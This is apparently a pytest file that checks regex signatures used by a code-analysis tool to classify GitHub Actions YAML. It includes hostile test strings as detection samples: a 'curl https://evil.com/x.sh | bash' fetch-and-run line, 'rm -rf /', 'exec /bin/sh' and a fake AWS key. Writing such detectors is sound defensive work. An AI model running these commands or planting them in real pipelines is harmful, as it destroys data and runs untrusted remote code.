"""yaml strict structural-signature coverage.

Migrated out of tests/core_engine/test_language_standards_strict.py, then
colocated here in tests/extraction/languages/ alongside the extraction
gauntlets' own test_<lang>.py files (the `_strict` suffix on this filename
avoids a basename collision between the two under pytest's default import
mode). See tests/core_engine/test_language_standards_strict.py's git history
for the original single-file layout and section banners (Issue references, etc).
"""

import sys
from pathlib import Path

import pytest

from gitgalaxy.standards.language_standards import LANGUAGE_DEFINITIONS

_LANGUAGES_DIR = str(Path(__file__).resolve().parent)
if _LANGUAGES_DIR not in sys.path:
    sys.path.insert(0, _LANGUAGES_DIR)

from _strict_harness import assert_redos_immune  # noqa: E402 # type: ignore


# NOTE: this test was originally grouped under a shared "cross-language sweep"
# section in tests/core_engine/test_language_standards_strict.py (before that file
# was split into tests/extraction/languages/, one file per language) alongside
# equivalent regressions for several other languages, all fixing the same bug
# *shape* found by one systematic sweep. Shared context below, duplicated into
# every language file that sweep touched -- see git history for the original,
# single copy.
# ==============================================================================
# POWERSHELL: STRICT STRUCTURAL SIGNATURE COVERAGE (Issue #604)
# ==============================================================================


YAML_RULES = LANGUAGE_DEFINITIONS["yaml"]["rules"]

# NOTE: this test was originally grouped under a shared "cross-language sweep"
# section in tests/core_engine/test_language_standards_strict.py (before that file
# was split into tests/extraction/languages/, one file per language) alongside
# equivalent regressions for several other languages, all fixing the same bug
# *shape* found by one systematic sweep. Shared context below, duplicated into
# every language file that sweep touched -- see git history for the original,
# single copy.
# ==============================================================================
# POWERSHELL: STRICT STRUCTURAL SIGNATURE COVERAGE (Issue #604)
# ==============================================================================


_YAML_SIMPLE_CASES = [
    # (signature, positive snippet, text expected to NOT match / None to skip)
    ("branch", "run: if [ -f file ]; then echo hi; fi", "run: echo hi"),
    ("args", "      with:\n        node-version: 18\n", "      run: npm install\n"),
    ("structural_boundaries", "    needs: build", "    name: My Job"),
    ("func_start", "      - run: npm test", "      - name: Run tests"),
    ("class_start", "jobs:\n", "on:\n  push:\n"),
    ("safety", "permissions:\n  contents: read", "permissions:\n  contents: write"),
    (
        "safety_bypasses",
        "run: curl https://evil.com/x.sh | bash",
        "run: curl https://example.com/data.json -o data.json",
    ),
    ("high_risk_execution", "run: rm -rf /", "run: rm -rf /tmp/cache"),
    ("io", "run: apt-get install -y curl", "run: echo done"),
    ("api", "on:\n  push:\n    branches: [main]\n", "on:\n  schedule:\n    - cron: '0 0 * * *'\n"),
    ("state_mutation", "env:\n  NODE_ENV: production\n", "outputs:\n  result: success\n"),
    ("dead_code", "  # run: rm -rf /", "  # This step cleans up temp files"),
    ("doc", "name: CI Pipeline", "on: push"),
    ("test", "run: npm test", "run: npm run build"),
    ("concurrency", "concurrency:\n  group: ci-${{ github.ref }}\n", "strategy:\n  fail-fast: false\n"),
    ("globals", "run: echo ${{ github.actor }}", "run: echo hello"),
    (
        "reflection_metaprogramming",
        "value: ${{ fromJson(needs.build.outputs.matrix) }}",
        "value: ${{ needs.build.outputs.matrix }}",
    ),
    ("import", "      - uses: actions/checkout@v4", "      - run: npm install"),
    ("planned_debt", "  # TODO: add caching", "  # This step installs deps"),
    ("fragile_debt", "  # HACK: workaround for flaky test", "  # Normal comment"),
    ("events", "  schedule:\n    - cron: '0 0 * * *'\n", "  push:\n    branches: [main]\n"),
    ("dependency_injection", "env:\n  TOKEN: ${{ secrets.GITHUB_TOKEN }}\n", "env:\n  TOKEN: ${{ github.token }}\n"),
    ("telemetry", "run: echo '::warning::Something looks off'", "run: echo hello"),
    ("debug_prints", "run: echo 'debug info'", "run: npm install"),
    ("panics_and_aborts", "run: exit 1", "run: exit 0"),
    ("thread_sleeps", "run: sleep 5", "run: sleep"),
    (
        "immutability_locks",
        "uses: actions/checkout@a4f6be9e6c9d6b6c8cf1e2f1a3f5c7e9d0a1b2c3",
        "uses: actions/checkout@v4",
    ),
    ("listeners", "webhook: http://example.com/hook", "endpoint: http://example.com/hook"),
    ("test_skip", "run: npm test -- --passWithNoTests", "run: npm test"),
    # --- DEEP ADVERSARIAL CASES FOR HIGH-AMBIGUITY SIGNATURES ---
    # args: tolerating comments and blank lines between 'with:' and args
    ("args", "with:\n  # comment\n  foo: bar", "without:\n  foo: bar"),
    ("args", "with:\n\n  foo: bar", "without:\n  foo: bar"),
    ("args", "  with:\n    # comment\n    foo: bar", "without:\n  foo: bar"),

    # api: tolerating comments and blank lines between 'on:' and events
    ("api", "on:\n  # comment\n  push:", "on:\n  # comment\n  release:"),
    ("api", "on:\n\n  push:", "on:\n\n  release:"),
    ("api", "on: # trigger\n  pull_request:", "on: # trigger\n  release:"),

    # state_mutation: tolerating comments and blank lines between 'env:' and vars
    ("state_mutation", "env:\n  # var comment\n  FOO: bar", "env:\n  # comment\n"),
    ("state_mutation", "env:\n\n  FOO: bar", "env:\n\n"),
    ("state_mutation", "env: # vars\n  FOO: bar", "env: # vars\n"),

    # class_start: tolerating comments and blank lines within the job definition before 'uses:'
    ("class_start", "job:\n  # comment\n  uses: foo", "name: job\nuses: foo"),
    ("class_start", "job:\n\n  uses: foo", "name: job\nuses: foo"),
    ("class_start", "job:\n  needs: build\n  # comment\n  uses: foo", "name: job\nuses: foo"),

    # import / _dependency_capture: tolerating comments and blank lines between 'uses:' and the target
    ("import", "uses: # comment\n  actions/checkout@v4", "uses: # comment\n"),
    ("import", "uses:\n  # comment\n  actions/checkout@v4", "uses:\n  # comment\n"),
    ("import", "uses:\n\n  actions/checkout@v4", "uses:\n\n"),
    ("import", "uses:   \n  actions/checkout@v4", "uses:   \n"),
    # args (more)
    ("args", "with:\n  # comment 1\n  # comment 2\n  foo: bar", "without:\n  foo: bar"),
    ("args", "with:  # inline\n\n  # block\n  foo: bar", "without:\n  foo: bar"),
    ("args", "  with:\n    # comment 1\n    # comment 2\n    foo: bar", "without:\n  foo: bar"),

    # api (more)
    ("api", "on:\n  # trigger 1\n  # trigger 2\n  push:", "on:\n  # comment\n  release:"),
    ("api", "on:  # trigger\n\n  # trigger 2\n  push:", "on:\n\n  release:"),

    # state_mutation (more)
    ("state_mutation", "env:\n  # var 1\n  # var 2\n  FOO: bar", "env:\n  # comment\n"),
    ("state_mutation", "env:  # vars\n\n  # more\n  FOO: bar", "env: # vars\n"),

    # class_start (more)
    ("class_start", "job:\n  needs: build\n  # comment 1\n  # comment 2\n  uses: foo", "name: job\nuses: foo"),
    ("class_start", "job:\n  # a\n  # b\n  # c\n  # d\n  # e\n  uses: foo", "name: job\nuses: foo"),
    ("class_start", "workflow_call:\n  # inputs\n  uses: foo", "name: workflow_call\nuses: foo"),

    # import / _dependency_capture (more)
    ("import", "uses: # comment 1\n  # comment 2\n  actions/checkout@v4", "uses: # comment 1\n"),
    ("import", "uses:\n  # comment 1\n  # comment 2\n  actions/checkout@v4", "uses:\n  # comment 1\n"),
    ("import", "image: # comment\n  node:18", "image: # comment\n"),
    # --- Issue #1072: signature keys with zero _SIMPLE_CASES coverage ---
    ("hardcoded_secrets", 'api_key: "AKIAIOSFODNN7EXAMPLE1"', 'name: "AKIAIOSFODNN7EXAMPLE1"'),
]

# NOTE: this test was originally grouped under a shared "cross-language sweep"
# section in tests/core_engine/test_language_standards_strict.py (before that file
# was split into tests/extraction/languages/, one file per language) alongside
# equivalent regressions for several other languages, all fixing the same bug
# *shape* found by one systematic sweep. Shared context below, duplicated into
# every language file that sweep touched -- see git history for the original,
# single copy.
# ==============================================================================
# POWERSHELL: STRICT STRUCTURAL SIGNATURE COVERAGE (Issue #604)
# ==============================================================================


@pytest.mark.parametrize("signature,positive,negative", _YAML_SIMPLE_CASES)
def test_yaml_signature_positive_and_negative(signature, positive, negative):
    pattern = YAML_RULES[signature]
    assert pattern is not None, f"yaml's {signature!r} rule is unexpectedly None"
    assert pattern.search(positive), f"yaml {signature!r} failed to match its own documented positive case"
    if negative is not None:
        assert not pattern.search(negative), (
            f"yaml {signature!r} incorrectly matched an excluded/negative case: {negative!r}"
        )


# NOTE: this test was originally grouped under a shared "cross-language sweep"
# section in tests/core_engine/test_language_standards_strict.py (before that file
# was split into tests/extraction/languages/, one file per language) alongside
# equivalent regressions for several other languages, all fixing the same bug
# *shape* found by one systematic sweep. Shared context below, duplicated into
# every language file that sweep touched -- see git history for the original,
# single copy.
# ==============================================================================
# POWERSHELL: STRICT STRUCTURAL SIGNATURE COVERAGE (Issue #604)
# ==============================================================================


def test_yaml_high_risk_execution_root_delete_trailing_boundary_regression():
    """
    Regression test: the shared trailing `\\b` after the `rm -rf /`
    alternative required a word character immediately following the `/`
    -- never true for how this destructive payload is actually written
    (as the entire `run:` command, followed by end-of-line/end-of-string,
    both non-word). The single most common real-world form of this
    supply-chain-sabotage payload never matched at all.
    """
    pattern = YAML_RULES["high_risk_execution"]
    assert pattern.search("run: rm -rf /"), "bare 'rm -rf /' still didn't match"
    assert pattern.search("run: rm -rf /\n")
    assert pattern.search("run: rm -rf /2"), "digit-following form regressed"
    assert not pattern.search("run: rm -rf /tmp/cache"), "path-following form incorrectly matched"
    assert pattern.search('run: eval "$CMD"')
    assert pattern.search("run: exec /bin/sh")


# NOTE: this test was originally grouped under a shared "cross-language sweep"
# section in tests/core_engine/test_language_standards_strict.py (before that file
# was split into tests/extraction/languages/, one file per language) alongside
# equivalent regressions for several other languages, all fixing the same bug
# *shape* found by one systematic sweep. Shared context below, duplicated into
# every language file that sweep touched -- see git history for the original,
# single copy.
# ==============================================================================
# POWERSHELL: STRICT STRUCTURAL SIGNATURE COVERAGE (Issue #604)
# ==============================================================================


def test_yaml_test_skip_double_dash_flag_leading_boundary_regression():
    """
    Regression test: `--passWithNoTests` and `--no-audit` both start with
    `-` (non-word), so the shared leading `\\b` could only fire when a
    word char immediately preceded the `-` -- never true for how these
    flags are actually written (always preceded by whitespace, e.g. after
    `--` or a command name). Both never matched at all.
    """
    pattern = YAML_RULES["test_skip"]
    assert pattern.search("run: npm test -- --passWithNoTests"), "--passWithNoTests still didn't match"
    assert pattern.search("run: pytest --no-audit"), "--no-audit still didn't match"
    assert pattern.search("run: skipTests")
    assert pattern.search("run: npm test || true")


# NOTE: this test was originally grouped under a shared "cross-language sweep"
# section in tests/core_engine/test_language_standards_strict.py (before that file
# was split into tests/extraction/languages/, one file per language) alongside
# equivalent regressions for several other languages, all fixing the same bug
# *shape* found by one systematic sweep. Shared context below, duplicated into
# every language file that sweep touched -- see git history for the original,
# single copy.
# ==============================================================================
# POWERSHELL: STRICT STRUCTURAL SIGNATURE COVERAGE (Issue #604)
# ==============================================================================


def test_yaml_events_schedule_anchor_regression():
    """
    Regression test: the `schedule:` alternative had no `^[ \\t]*` anchor
    (unlike its siblings `repository_dispatch:` and `cron:`), so it could
    match anywhere a line merely contained the substring `schedule:` --
    including keys like `release_schedule:` that have nothing to do with
    the GitHub Actions `on.schedule` trigger. Anchoring it to line-start
    fixes the false positive without affecting the real trigger form.
    """
    pattern = YAML_RULES["events"]
    assert pattern.search("  schedule:\n    - cron: '0 0 * * *'\n"), "real on.schedule trigger regressed"
    assert not pattern.search("release_schedule: weekly"), "unrelated key incorrectly matched"
    assert not pattern.search("  description: 'set the schedule: carefully'\n"), (
        "substring inside prose incorrectly matched"
    )


# NOTE: this test was originally grouped under a shared "cross-language sweep"
# section in tests/core_engine/test_language_standards_strict.py (before that file
# was split into tests/extraction/languages/, one file per language) alongside
# equivalent regressions for several other languages, all fixing the same bug
# *shape* found by one systematic sweep. Shared context below, duplicated into
# every language file that sweep touched -- see git history for the original,
# single copy.
# ==============================================================================
# POWERSHELL: STRICT STRUCTURAL SIGNATURE COVERAGE (Issue #604)
# ==============================================================================


def test_yaml_telemetry_workflow_command_regression():
    """
    Regression test: the original pattern required `::debug`/`::warning`/
    `::error` to sit at the true start of a line (after only leading
    whitespace) followed by a space -- but GitHub Actions workflow
    commands are always emitted via `echo "::warning::msg"` (never as a
    bare line start), and the most common real form uses `::` directly
    after the keyword with no space at all (e.g. `::warning::msg`, vs.
    the rarer `::warning file=a,line=1::msg` parameter form). The
    anchored, space-only pattern never matched a single realistic
    workflow-command line.
    """
    pattern = YAML_RULES["telemetry"]
    assert pattern.search('run: echo "::warning::Deprecated API used"'), "no-space :: form still didn't match"
    assert pattern.search('run: echo "::error file=app.js,line=1::Something broke"'), "space+params form regressed"
    assert pattern.search('run: echo "::debug::checkpoint reached"')
    assert not pattern.search("run: echo hello")


# NOTE: this test was originally grouped under a shared "cross-language sweep"
# section in tests/core_engine/test_language_standards_strict.py (before that file
# was split into tests/extraction/languages/, one file per language) alongside
# equivalent regressions for several other languages, all fixing the same bug
# *shape* found by one systematic sweep. Shared context below, duplicated into
# every language file that sweep touched -- see git history for the original,
# single copy.
# ==============================================================================
# POWERSHELL: STRICT STRUCTURAL SIGNATURE COVERAGE (Issue #604)
# ==============================================================================


def test_yaml_reflection_metaprogramming_redos_immunity():
    """
    Regression test for a confirmed real O(n^2) ReDoS: the unbounded
    `[a-zA-Z]+` between `to[A-Z]` and the required `(` , combined with
    unanchored search, is quadratic on payloads packed with `to[A-Z]`
    starts that never reach a `(`. Confirmed genuine O(n^2) scaling
    (~0.02s/0.08s/0.30s/1.21s/4.84s at n=2k/4k/8k/16k/32k, ~4x per
    doubling) before being bounded to a generous-but-finite cap.
    """
    pattern = YAML_RULES["reflection_metaprogramming"]
    poison = "toA" * 40000
    assert_redos_immune(pattern, poison, timeout_sec=3.0)

    assert pattern.search("value: ${{ fromJson(needs.build.outputs.matrix) }}")
    assert pattern.search('run: node -e "console.log(x.toJson())"')
    assert pattern.search('run: node -e "console.log(x.toUpperCase())"')


# NOTE: this test was originally grouped under a shared "cross-language sweep"
# section in tests/core_engine/test_language_standards_strict.py (before that file
# was split into tests/extraction/languages/, one file per language) alongside
# equivalent regressions for several other languages, all fixing the same bug
# *shape* found by one systematic sweep. Shared context below, duplicated into
# every language file that sweep touched -- see git history for the original,
# single copy.
# ==============================================================================
# POWERSHELL: STRICT STRUCTURAL SIGNATURE COVERAGE (Issue #604)
# ==============================================================================


def test_yaml_ambiguity_sweep_shared_literals_are_not_bugs():
    """
    Documents the automated ambiguity sweep's findings for yaml -- all
    confirmed genuine, intentional double-classifications via direct
    empirical verification against a realistic multi-section workflow
    file, not false positives:

    - `structural_boundaries` <-> `state_mutation` on an `env:` block:
      setting job/step environment variables is simultaneously a
      structural section boundary AND a state mutation (it reassigns
      environment state) -- both are correct.
    - `structural_boundaries` <-> `concurrency` on a `strategy:`/
      `matrix:` block: a parallel build matrix is simultaneously a
      structural section boundary AND a concurrency construct.
    - `class_start` <-> `import` on a job whose body is `uses:`/`image:`
      (a reusable-workflow-call or container job): the job definition is
      simultaneously an object-boundary (`class_start`) AND a dependency
      resolution (`import`) -- GitHub Actions genuinely conflates "define
      this job" and "import this reusable workflow/image" into the same
      syntax for that job shape.
    - `safety_bypasses` <-> `io` on `curl ... | bash`: the curl invocation
      is both a network I/O operation AND (piped to a shell) a classic
      supply-chain safety bypass -- correctly double-classified.
    - `import` <-> `immutability_locks` on a SHA-pinned `uses:` line: the
      dependency import and its immutability lock (SHA-1 pinning) are
      the same token by design -- `immutability_locks` exists
      specifically to detect this shape on `uses:` lines.
    """
    structural_boundaries = YAML_RULES["structural_boundaries"]
    state_mutation = YAML_RULES["state_mutation"]
    concurrency = YAML_RULES["concurrency"]
    class_start = YAML_RULES["class_start"]
    import_ = YAML_RULES["import"]
    safety_bypasses = YAML_RULES["safety_bypasses"]
    io = YAML_RULES["io"]
    immutability_locks = YAML_RULES["immutability_locks"]

    env_block = "env:\n  NODE_ENV: production\n"
    assert structural_boundaries.search(env_block)
    assert state_mutation.search(env_block)

    matrix_block = "strategy:\n  matrix:\n    node: [16, 18]\n"
    assert structural_boundaries.search(matrix_block)
    assert concurrency.search(matrix_block)

    reusable_job = "reusable:\n  uses: ./.github/workflows/other.yml\n"
    assert class_start.search(reusable_job)
    assert import_.search(reusable_job)

    curl_pipe = "run: curl https://example.com/install.sh | bash"
    assert safety_bypasses.search(curl_pipe)
    assert io.search(curl_pipe)

    pinned_uses = "      - uses: actions/checkout@a4f6be9e6c9d6b6c8cf1e2f1a3f5c7e9d0a1b2c3"
    assert import_.search(pinned_uses)
    assert immutability_locks.search(pinned_uses)
